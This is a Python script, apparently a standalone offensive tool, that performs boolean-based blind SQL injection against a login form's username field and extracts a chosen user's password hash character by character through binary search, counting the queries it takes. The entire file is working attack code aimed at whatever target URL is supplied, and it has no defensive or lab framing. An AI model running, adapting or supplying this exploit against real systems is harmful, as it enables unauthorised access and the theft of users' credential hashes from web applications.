import requests
import argparse

# Setup argument parser for command-line options
parser = argparse.ArgumentParser(description='SQL Injection Binary Search Exploiter')
parser.add_argument('--target', required=True, help='Target URL of the vulnerable login form')
parser.add_argument('--needle', required=True, help='Text that indicates a successful SQL query')
args = parser.parse_args()

# Global variables
total_queries = 0
charset = "0123456789abcdef"  # Add or remove characters based on the expected hash format

# Perform an SQL injection query and check if the needle is in the response
def injected_query(payload):
    global total_queries
    total_queries += 1
    try:
        response = requests.post(args.target, data={"username": f"admin' AND {payload}--", "password": "password"})
        return args.needle not in response.text
    except requests.RequestException as e:
        print(f"Error occurred during HTTP request: {e}")
        return False

# Perform a binary search to find the correct character of the hash
def binary_search_query(index, user_id, low, high):
    while low <= high:
        mid = (low + high) // 2
        char = charset[mid]
        if boolean_query(index, user_id, char):
            high = mid - 1
        else:
            low = mid + 1
    # Ensure the character is within the charset bounds
    return charset[max(0, min(low, len(charset) - 1))]

# Execute a boolean-based SQL injection to determine if a condition is true
def boolean_query(offset, user_id, character, operator=">"):
    payload = f"(SELECT hex(substr(password,{offset},1)) FROM users WHERE id = {user_id}) {operator} hex('{character}')"
    return injected_query(payload)

# Extract the hash using binary search
def extract_hash(charset, user_id, password_length):
    found = ""
    for index in range(1, password_length + 1):
        char = binary_search_query(index, user_id, 0, len(charset) - 1)
        found += char
        print(f"Found character {index} of {password_length}: {char}", end='\r', flush=True)
    return found

# Report the total number of queries
def total_queries_taken():
    global total_queries
    print(f"\n[!] {total_queries} total queries executed!")
    total_queries = 0

# Main execution logic
if __name__ == '__main__':
    try:
        user_id = input("Enter a user ID to extract the password hash: ")
        password_length = int(input("Enter the expected password hash length: "))
        if password_length:
            user_hash = extract_hash(charset, user_id, password_length)
            print(f"\n[-] User {user_id} hash: {user_hash}")
            total_queries_taken()
        else:
            print("\n[X] Invalid password hash length.")
    except KeyboardInterrupt:
        print("\nExecution interrupted by the user.")
    except ValueError:
        print("\n[X] Invalid input. Please enter a valid numeric length.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
